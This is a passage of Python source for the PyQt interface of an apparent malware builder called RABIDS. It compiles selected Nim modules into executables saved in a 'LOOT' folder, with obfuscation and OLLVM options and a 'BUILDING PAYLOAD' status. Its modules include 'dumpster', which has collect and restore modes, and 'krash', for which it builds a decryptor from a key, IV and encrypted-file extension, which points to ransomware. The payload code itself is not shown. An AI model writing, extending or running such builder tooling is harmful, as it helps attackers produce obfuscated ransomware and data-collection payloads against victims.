                icon_label.setText("Build Failed!")
            icon_label.setAlignment(Qt.AlignCenter)
            self.options_layout.addStretch()
            self.options_layout.addWidget(icon_label, 0, Qt.AlignCenter)
            self.options_layout.addStretch()
        self.build_btn.setEnabled(True)

    def run_compiler(self):
        if not self.selected_modules:
            self.log_message("Error: No modules selected.", "error")
            return
        if not self.exe_name_input.text():
            self.log_message("Error: Output executable name is required.", "error")
            return

        loot_dir = Path(self.script_dir) / 'LOOT'
        loot_dir.mkdir(exist_ok=True)
        exe_name = self.exe_name_input.text()
        output_path = loot_dir / exe_name

        module_files = [f"MODULE/{Path(m).name}.nim" for m in self.selected_modules]
        cmd = [sys.executable, "compiler.py"]
        if len(self.selected_modules) > 1:
            cmd.extend(["--merge"] + module_files)
        elif module_files:
            cmd.extend(["--nim_file", module_files[0]])
        cmd.extend(["--output_exe", str(output_path)])
        target = f"{self.target_os_combo.currentText()}:{self.target_arch_combo.currentText()}"
        cmd.extend(["--target", target])

        options = []
        for key, widget in self.option_inputs.items():
            module_name, option_name = key.split(":")
            if module_name in self.selected_modules:
                if isinstance(widget, QLineEdit):
                    value = widget.text()
                elif isinstance(widget, QCheckBox):
                    value = str(widget.isChecked()).lower()
                else:
                    continue
                options.append(f"--option={option_name}={value}")

        if 'module/dumpster' in self.selected_modules:
            if not any("collectMode" in opt or "restoreMode" in opt for opt in options):
                 options.append("--option=collectMode=true")

        if self.obfuscate_check.isChecked():
            cmd.append("--obfuscate")
            if self.ollvm_input.text():
                cmd.extend(["--ollvm"] + self.ollvm_input.text().split())

        cmd.extend(options)
        self.module_options_group.setTitle("BUILDING PAYLOAD...")
        self.show_loading_view()
        self.build_btn.setEnabled(False)
        self.output_log.clear()

        self.log_message(f"Running command: {' '.join(shlex.quote(c) for c in cmd)}\n", "system")
        self.build_thread = BuildThread(cmd)
        self.build_thread.log_signal.connect(self.log_message)
        self.build_thread.finished_signal.connect(self.build_finished)
        self.build_thread.start()

    def show_garbage_loading_view(self):
        for i in reversed(range(self.restore_dest_files_list.count())):
            item = self.restore_dest_files_list.takeItem(i)
            del item

        self.restore_dest_files_list.clear()
        icon_label = QLabel()
        icon_path = os.path.join(self.script_dir, "ASSETS", "garbage.png")
        pixmap = QPixmap(icon_path)
        if not pixmap.isNull():
            icon_label.setPixmap(pixmap.scaled(300, 300, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        else:
            icon_label.setText("Restoring...")
        list_item = QListWidgetItem()
        list_widget = QWidget()
        layout = QHBoxLayout(list_widget)
        layout.addWidget(icon_label)
        layout.setAlignment(Qt.AlignCenter)
        list_item.setSizeHint(list_widget.sizeHint())
        self.restore_dest_files_list.addItem(list_item)
        self.restore_dest_files_list.setItemWidget(list_item, list_widget)
        QApplication.processEvents()

    def clear_garbage_loading_view(self):
        for i in reversed(range(self.restore_dest_files_list.count())):
            item = self.restore_dest_files_list.takeItem(i)
            del item

        self.restore_dest_files_list.clear()
        QApplication.processEvents()


    def browse_directory(self, line_edit):
        directory = QFileDialog.getExistingDirectory(self, "Select Directory")
        if directory:
            home_path = str(Path.home())
            if directory.startswith(home_path):
                directory = directory.replace(home_path, "$HOME", 1)

            line_edit.setText(directory)

    def browse_open_file(self, line_edit):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Dumpster File", "", "All Files (*)")
        if file_path:
            line_edit.setText(file_path)

    def run_garbage_collector_restore(self):
        self.update_restore_destination_view()
        dumpster_file = self.restore_dumpster_file_edit.text()
        output_dir = self.restore_output_dir_edit.text()
        if not dumpster_file or not output_dir:
            self.log_message("Error: Both dumpster file and output directory are required for restoration.", "error")
            return

        self.show_garbage_loading_view()
        self.tab_widget.setCurrentIndex(1)
        self.output_log.clear()

        cmd = [
            sys.executable, "compiler.py",
            "--nim_file", "MODULE/dumpster.nim",
            "--output_exe", str(Path(tempfile.gettempdir()) / "rabids_restore_tool"),
            "--option=restoreMode=true", f"--option=dumpsterFile={dumpster_file}", f"--option=outputDir={output_dir}"
        ]
        self.log_message(f"Running command: {' '.join(shlex.quote(c) for c in cmd)}", "system")
        self.build_thread = BuildThread(cmd)
        self.build_thread.log_signal.connect(self.log_message)
        self.build_thread.finished_signal.connect(self.build_finished)
        self.build_thread.start()

    def run_uncrash_compiler(self):
        exe_name = self.uncrash_exe_name_edit.text()
        if not exe_name:
            self.log_message("Error: Decryptor executable name is required.", "error")
            return

        self.tab_widget.setCurrentIndex(1)
        self.output_log.clear()
        self.log_message("Building decryptor...", "system")

        loot_dir = Path(self.script_dir) / 'LOOT'
        loot_dir.mkdir(exist_ok=True)
        output_path = loot_dir / exe_name

        key = self.uncrash_key_edit.text()
        iv = self.uncrash_iv_edit.text()
        ext = self.uncrash_ext_edit.text()

        cmd = [
            sys.executable, "compiler.py",
            "--nim_file", "MODULE/krash.nim",
            "--output_exe", str(output_path),
            "--target", f"{self.uncrash_os_combo.currentText()}:{self.uncrash_arch_combo.currentText()}",
            "--nim-only"
        ]

        options = [
            f"--option=key={key}",
            f"--option=iv={iv}",
            f"--option=extension={ext}",
            "--option=decrypt=true"
        ]
        cmd.extend(options)

        self.log_message(f"Running command: {' '.join(shlex.quote(c) for c in cmd)}\n", "system")
        self.build_thread = BuildThread(cmd)
        self.build_thread.log_signal.connect(self.log_message)
        self.build_thread.finished_signal.connect(self.build_finished)
        self.build_thread.start()

    def update_restore_destination_view(self):
        self.clear_garbage_loading_view()
        self.restore_dest_files_list.clear()
        dest_dir_str = self.restore_output_dir_edit.text()
        if not dest_dir_str:
            self.restore_dest_files_list.addItem("Select a destination directory to see its contents.")
            return

        dest_dir = Path(dest_dir_str)
        if not dest_dir.is_dir():
            self.restore_dest_files_list.addItem(f"Directory does not exist: {dest_dir}")
            return
        try:
            files = list(dest_dir.iterdir())
            if not files:
                self.restore_dest_files_list.addItem("Destination directory is empty.")
                return
            for item_path in sorted(files):
                self.restore_dest_files_list.addItem(QListWidgetItem(item_path.name))
        except Exception as e:
            self.restore_dest_files_list.addItem(f"Error reading directory: {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = RABIDSGUI()
    window.show()
    sys.exit(app.exec_())